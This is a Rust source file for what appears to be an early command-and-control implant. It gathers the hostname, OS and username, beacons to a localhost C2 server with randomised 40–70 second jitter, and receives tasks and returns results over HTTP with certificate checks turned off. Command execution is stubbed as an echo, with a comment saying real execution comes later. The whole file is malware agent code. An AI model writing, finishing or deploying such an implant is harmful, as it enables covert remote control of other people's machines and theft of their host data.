use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use sysinfo::System;
use tokio::time::sleep;
use uuid::Uuid;
use rand::Rng;

#[derive(Serialize)]
struct Checkin {
    id: String,
    hostname: String,
    os: String,
    username: String,
    ip: String, // placeholder for now
}

#[derive(Deserialize)]
struct Task {
    id: String,
    command: String, // expand later to enum
}

#[derive(Serialize)]
struct TaskResult {
    agent_id: String,
    task_id: String,
    output: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // ← only for self-signed / local dev!
        .build()?;

    let agent_id = Uuid::new_v4().to_string();

    // System information
    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
    let os_version = System::long_os_version().unwrap_or_else(|| "unknown".to_string());
    let username = whoami::username(); // requires whoami crate

    let checkin = Checkin {
        id: agent_id.clone(),
        hostname,
        os: os_version,
        username,
        ip: "127.0.0.1".to_string(), // ← improve later if needed
    };

    println!("[+] Agent started – ID: {}", agent_id);
    println!("[+] Beaconing to http://127.0.0.1:8000/checkin every 40-70s");

    loop {
        match client
            .post("http://127.0.0.1:8000/checkin")
            .json(&checkin)
            .send()
            .await
        {
            Ok(res) => {
                println!("→ Check-in sent successfully");

                if res.status().is_success() {
                    // Deserialize once – consumes the response body
                    let maybe_task: Result<Option<Task>, _> = res.json().await;

                    match maybe_task {
                        Ok(Some(task)) => {
                            println!("!!! TASK RECEIVED !!!");
                            println!("  Task ID  : {}", task.id);
                            println!("  Command  : {}", task.command);

                            // Echo for now – replace with real execution later
                            let output = format!("Echo from agent: {}", task.command);

                            // Send result back (ignore errors for simplicity now)
                            let _ = client
                                .post("http://127.0.0.1:8000/result")
                                .json(&TaskResult {
                                    agent_id: agent_id.clone(),
                                    task_id: task.id,
                                    output,
                                })
                                .send()
                                .await;
                        }
                        Ok(None) => {
                            println!("No task queued this time");
                        }
                        Err(e) => {
                            println!("Failed to parse task JSON: {}", e);
                        }
                    }
                } else {
                    println!("Server responded with error: {}", res.status());
                }
            }
            Err(e) => {
                println!("Check-in failed: {}", e);
                // You could add exponential backoff here later
            }
        }

        // Sleep with jitter
        let jitter_ms = rand::thread_rng().gen_range(0..30_000);
        sleep(Duration::from_millis(40_000 + jitter_ms)).await;
    }
}
